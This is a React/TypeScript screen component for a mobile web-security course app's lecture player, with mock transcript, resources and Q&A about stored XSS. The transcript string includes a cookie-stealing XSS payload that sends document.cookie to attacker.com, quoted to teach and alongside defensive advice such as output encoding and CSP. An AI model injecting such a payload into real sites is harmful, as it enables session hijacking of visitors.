import { useState } from "react";
import { useNavigate, useParams } from "react-router";
import { ArrowLeft, PlayCircle, ChevronRight } from "lucide-react";

const MOCK_TRANSCRIPT = `0:00 — In this lecture, we'll dive deep into stored XSS vulnerabilities and how attackers exploit them.

0:45 — Unlike reflected XSS, stored attacks persist in the application's database and execute for every visitor.

2:10 — Let's look at a real-world example from a bug bounty report. The attacker found a comment field that didn't sanitize output.

3:30 — The payload: <script>document.location='https://attacker.com/steal?c='+document.cookie</script>

5:00 — Every user who viewed that page had their session hijacked automatically.

7:15 — Defense: always encode output using your framework's templating engine. Never use innerHTML with untrusted data.

9:00 — Use Content Security Policy (CSP) as a second layer of defense — it blocks inline script execution entirely.`;

const MOCK_RESOURCES = [
  { title: "OWASP XSS Prevention Cheat Sheet", type: "PDF", url: "#" },
  { title: "Lab: Exploit Stored XSS in DVWA", type: "LAB", url: "#" },
  { title: "PortSwigger Web Security Academy — XSS", type: "LINK", url: "#" },
];

const MOCK_QA = [
  { user: "DevSec_Mike", question: "Does Angular's DomSanitizer protect against this?", votes: 8, answer: "Yes — Angular's default template binding escapes output. Only bypassSecurityTrustHtml() is dangerous." },
  { user: "CipherGirl99", question: "What about React?", votes: 5, answer: "React's JSX also escapes by default. dangerouslySetInnerHTML is the equivalent danger zone." },
];

export function LecturePlayerScreen() {
  const navigate = useNavigate();
  const { lectureId } = useParams();
  const [activeTab, setActiveTab] = useState<"notes" | "transcript" | "resources" | "qa">("notes");
  const [notes, setNotes] = useState("");
  const [isPlaying, setIsPlaying] = useState(false);
  const [progress, setProgress] = useState(35);

  const nextLectureId = lectureId ? String(Number(lectureId.replace("l", "")) + 1) : "l2";

  return (
    <div className="h-screen bg-[#0A0E1A] max-w-[393px] mx-auto overflow-y-auto">
      {/* Video player */}
      <div className="h-[220px] bg-[#050810] relative flex items-center justify-center">
        <button
          onClick={() => setIsPlaying(!isPlaying)}
          className="w-16 h-16 rounded-full bg-[rgba(0,229,255,0.12)] flex items-center justify-center active:scale-90 transition-transform"
        >
          <PlayCircle size={40} stroke="#00E5FF" fill={isPlaying ? "rgba(0,229,255,0.3)" : "rgba(0,229,255,0.1)"} />
        </button>

        {/* Duration */}
        <div className="absolute bottom-8 right-4 text-[11px] text-[#8B95C9]">22:45</div>

        {/* Progress bar + scrubber */}
        <div
          className="absolute bottom-0 left-0 right-0 h-1 cursor-pointer"
          onClick={(e) => {
            const rect = e.currentTarget.getBoundingClientRect();
            setProgress(Math.round(((e.clientX - rect.left) / rect.width) * 100));
          }}
        >
          <div className="h-full bg-[#2A3362]">
            <div className="h-full bg-[#00E5FF] relative transition-all" style={{ width: `${progress}%` }}>
              <div className="absolute right-0 top-1/2 -translate-y-1/2 w-3 h-3 rounded-full bg-[#00E5FF] -translate-x-1/2" />
            </div>
          </div>
        </div>

        {/* Back button */}
        <button
          onClick={() => navigate("/course/web-security")}
          className="absolute top-12 left-6 w-10 h-10 rounded-full bg-[rgba(10,14,26,0.7)] flex items-center justify-center"
        >
          <ArrowLeft size={24} stroke="#EAEEFF" />
        </button>
      </div>

      {/* Content */}
      <div className="px-6 py-6 pb-8">
        <h3 className="text-[#EAEEFF] mb-2">Stored XSS Deep Dive</h3>
        <p className="text-[13px] text-[#8B95C9] mb-6">
          Module 3: Cross-Site Scripting · Web Application Security
        </p>

        {/* Tabs */}
        <div className="flex border-b border-[#2A3362] mb-6 -mx-6 px-6">
          {(["notes", "transcript", "resources", "qa"] as const).map((tab) => (
            <button
              key={tab}
              onClick={() => setActiveTab(tab)}
              className={`px-4 pb-3 text-[13px] capitalize ${
                activeTab === tab
                  ? "text-[#00E5FF] border-b-2 border-[#00E5FF]"
                  : "text-[#5A6599]"
              }`}
            >
              {tab === "qa" ? "Q&A" : tab}
            </button>
          ))}
        </div>

        {activeTab === "notes" && (
          <textarea
            placeholder="Tap to add notes..."
            value={notes}
            onChange={(e) => setNotes(e.target.value)}
            className="w-full min-h-[200px] p-4 rounded-xl bg-[#1E2545] border border-[#2A3362] text-[#EAEEFF] placeholder:text-[#5A6599] resize-none focus:outline-none focus:border-[#00E5FF] transition-colors"
          />
        )}

        {activeTab === "transcript" && (
          <div className="space-y-3">
            {MOCK_TRANSCRIPT.split("\n\n").map((line, i) => (
              <div key={i} className="flex gap-3">
                <span className="text-[11px] text-[#00E5FF] font-mono mt-0.5 flex-shrink-0">
                  {line.split("—")[0].trim()}
                </span>
                <p className="text-[13px] text-[#8B95C9] leading-relaxed">
                  {line.split("—").slice(1).join("—").trim()}
                </p>
              </div>
            ))}
          </div>
        )}

        {activeTab === "resources" && (
          <div className="space-y-3">
            {MOCK_RESOURCES.map((r, i) => (
              <a
                key={i}
                href={r.url}
                className="flex items-center gap-3 p-3 rounded-xl bg-[#1E2545] border border-[#2A3362] active:bg-[#252D55] transition-colors"
              >
                <span
                  className="px-2 py-0.5 rounded text-[10px] font-bold"
                  style={{
                    backgroundColor: r.type === "LAB" ? "rgba(57,255,20,0.08)" : "rgba(0,229,255,0.08)",
                    color: r.type === "LAB" ? "#39FF14" : "#00E5FF",
                  }}
                >
                  {r.type}
                </span>
                <span className="text-[13px] text-[#EAEEFF] flex-1">{r.title}</span>
                <ChevronRight size={16} stroke="#5A6599" />
              </a>
            ))}
          </div>
        )}

        {activeTab === "qa" && (
          <div className="space-y-4">
            {MOCK_QA.map((item, i) => (
              <div key={i} className="p-4 rounded-xl bg-[#1E2545] border border-[#2A3362]">
                <div className="flex items-center gap-2 mb-2">
                  <div className="w-6 h-6 rounded-full bg-[rgba(0,229,255,0.08)] flex items-center justify-center">
                    <span className="text-[10px] text-[#00E5FF] font-bold">{item.user[0]}</span>
                  </div>
                  <span className="text-[13px] text-[#8B95C9]">{item.user}</span>
                  <span className="ml-auto text-[11px] text-[#5A6599]">▲ {item.votes}</span>
                </div>
                <p className="text-[13px] text-[#EAEEFF] mb-2">{item.question}</p>
                <p className="text-[12px] text-[#8B95C9] pl-3 border-l border-[#2A3362]">{item.answer}</p>
              </div>
            ))}
          </div>
        )}

        {/* Next lesson */}
        <button
          onClick={() => navigate(`/lecture/l${nextLectureId}`)}
          className="w-full mt-6 p-4 rounded-xl bg-[#1E2545] border border-[#2A3362] flex items-center justify-between active:bg-[#252D55] transition-colors"
        >
          <span className="text-[15px] text-[#00E5FF] font-semibold">
            Next: Reflected XSS Attack Patterns
          </span>
          <ChevronRight size={20} stroke="#00E5FF" />
        </button>
      </div>
    </div>
  );
}
